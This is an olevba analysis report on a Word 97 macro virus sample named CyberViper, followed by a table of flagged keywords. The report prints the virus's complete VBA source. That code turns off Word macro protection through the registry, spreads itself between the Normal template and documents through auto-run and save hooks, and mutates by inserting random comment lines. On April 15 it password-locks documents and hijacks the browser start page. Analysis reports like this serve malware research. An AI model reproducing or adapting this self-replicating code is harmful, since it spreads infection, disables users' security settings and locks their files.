olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CViper-3fc02c9c176efaf37042ea08f5a47291513c552a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CViper-3fc02c9c176efaf37042ea08f5a47291513c552a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberViper.bas 
in file: Virus.MSWord.CViper-3fc02c9c176efaf37042ea08f5a47291513c552a - OLE stream: 'Macros/VBA/CyberViper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

'€‰ДE»ќ>‹а¤“вј'=oiгЊД‚¦
'ФN‚ОzжMО5fx›ЫХУ?ОЁ0]‰ћ¬Z[rfџЈn~^·Ъ‘9SПў
Rem      Macro.Word97.CyberViper
Rem Copyright by Wit AKA CyberViper 1999
Rem     ( My first macro virus )
Rem       ( Stealth, Polimorf )

'xЂJ?ЙmmJKЭЬ-Z Cr
On Error Resume Next
'ЩDЫЊД›‚€CЭ›3Рє‹hNЏа(–Ѓg‰lЎђ7Rk�ЌЋЫ№·(m
Application.EnableCancelKey = wdCancelDisabled
'JЯа¬Т"јѓЯ®NєЉ#ЂїmЪђ\РҐШµ
'ІQ•cxдв›‹>jЮB”gz–ЗVН1kЗПDЧ
ShowVisualBasicEditor = False
With System
 .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
'KЉ=]µОњҐ“Ц?iГo`RUзЩ|Б:‰
 .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
End With
With Options
'YЮ†Т
 .VirusProtection = (((1 * 1) - 1) / 10)
 .SaveNormalPrompt = (((1 * 1) - 1) / 10)
'^�:&Ж6¤†mЁівp;’ZM’єn-НЁђ9PC~zdРђѕ¶
'ј_{J2в
 .ConfirmConversions = (((1 * 1) - 1) / 10)
'U
End With
TmpFileName = "c:\CV.sys"
Call CyberMutate
'Ј:ХpA0СQЉЉAїз*0Еєc @
If ThisDocument = NormalTemplate Then
  For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "CyberViper" Then GoTo EndFind
  Next I
    NormalTemplate.VBProject.VBComponents("CyberViper").Export (TmpFileName)
'fҐ^ђvoUжгNё}ТЄ$#†]"Б5ГГ 9{)ґ«qЂ
    ActiveDocument.VBProject.VBComponents.Import TmpFileName
    ActiveDocument.Saved = False
Else
  For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "CyberViper" Then GoTo EndFind
  Next I
    Application.VBE.ActiveVBProject.VBComponents("CyberViper").Export (TmpFileName)
    NormalTemplate.VBProject.VBComponents.Import TmpFileName
'dЯњYЇЛ3•Ы7БKж_b‡
'НЗ‹-UHзV<oF‘П•®ве€jТЖx‚
    NormalTemplate.Saved = False
'ћПKFЇ}HMСj‚”ooд ОPФ№-Cі•Х%c–°fbб»Х·Ј(fЯ
    NormalTemplate.Save
'g!uQвЬЊpT*„Рд Ї‹svdЫџ¶ЁM%"ИG+n
'r1е{ІXK›а°»Њџ–ЁЂ,Е°tgМ8ЮАҐЌur TbєЭ›Ю
End If
EndFind:
Kill TmpFileName
If Month(Now()) = 4 And Day(Now()) = 15 Then
 ActiveDocument.Password = "-=CyberViper=-"
 ActiveDocument.Saved = False
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "file://C:\CV.HTM"
 Open "c:\CV.HTM" For Output As #1
 Print #1, "<HTML><HEAD></HEAD><script LANGUAGE=" + Chr(34) + "JavaScript1.2" + Chr(34) + ">"
'`+.+Щ(в#c
 Print #1, "a=1;setInterval(" + Chr(34) + "J()" + Chr(34) + ",10);function J(){a=a+.1;"
 Print #1, "self.moveBy((Math.random()*a*2 -a),(Math.random()*a*2)-a);}</script></BODY></HTML>"
 Close #1
End If
'3-nШRH|‡XФKЩWЃ#;2ЫK8џ5•
End Sub
Sub FileTemplates()
 Application.EnableCancelKey = wdCancelDisabled
'·
 Options.VirusProtection = (((1 * 1) - 1) / 10)
 Options.ConfirmConversions = (((1 * 1) - 1) / 10)
'gЌv—/m@ХУЭҐ-ћdЩJ­Нj1ҐxЊAЭbЮЪП1U‚в
End Sub
'LЯґiІf*J:�Dr"ёЌ(M0ЯаM$” ћЉ=Z,
Sub ToolsMacro()
'UАЃ°‘/hTґxИcII^Н&±'9I”Ќ“
 Call FileTemplates
'аLї®зLґVl?Ш#„Ыu
End Sub
Sub ViewVBCode()
Call FileTemplates
End Sub
Sub AutoClose()
 Call AutoOpen
'ўµ8дЎbЫ,)®eћҐ“іёќРѓ¬l<pH‚O6
'@Чs/\Ъ[Т­tзЋ°ћЕ
End Sub
Sub AutoNew()
 Call AutoOpen
'.б4Ч№„Мє
';.ГЛ6Ґ·>9
End Sub
' ¶X(ћz¦ќ
Sub FileSaveAs()
 Call AutoOpen
'§‹¶sr›П@-PDє1c®<gќєulG
'G®ЖЧ!ћQg
 Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
'ѕ«ip›©TpАВ5qmѓеP­]ЂL
 Call AutoOpen
'lrcx¤Й}&OjmжuЗ>ЃБ_.ХZЦrµv¶h
 ActiveDocument.Save
'QM
End Sub
Sub CyberMutate()
Call ClearRem
For C2 = 1 To 50
  U2 = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
  M1 = Int((U2 * Rnd) + 1)
  F4 = Int((40 * Rnd) + 1)
  CRem = "'"
  For C3 = 1 To F4
'"ґЭ2ЏУcђz‹Ёз!Ћ
   CRem = CRem + Chr(Int((200 * Rnd) + 32))
' (ЎИҐ
'Юе·ґ
'вќ^е¦ЁХAѓh¦ґ}Ўz¬Ф¦©aW%o7qhz"БH5
'¶Э'­)mжV`ШЊg/НcgIfЉ1`eєЪcЪmMXВЕШq
'‚ЫђT>wР.›“0КnD¶ћ
'ZЉў
  Next C3
  ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.InsertLines M1, CRem
Next C2
End Sub
'*E
Sub ClearRem()
'ЧБ°С� ќд@-x±”6
UUEnd = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
For UU = 1 To UUEnd
'@ѓcI�Й†P
 If Mid(ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.Lines(UU, 1), 1, 1) = "'" Then
   ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.DeleteLines UU
'‡+С|RVR›U$Л|еe§ФS%qџ‹з_§f
'Г°I�ЊW–„РiSзK>іR—Д‘‚ЪЬ4Ђz8‘buУtЂ0НШг
'72єd…b.ћb#»9ЛЖТx‰Pћ€“vT[
   UU = UU - 1
 End If
UUEnd = ThisDocument.VBProject.VBComponents("CyberViper").CodeModule.CountOfLines
'5#hX5ђgЎHЮmIБ
'/ФН™ЄбO*ЧЙEЇҐњ
Next UU
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
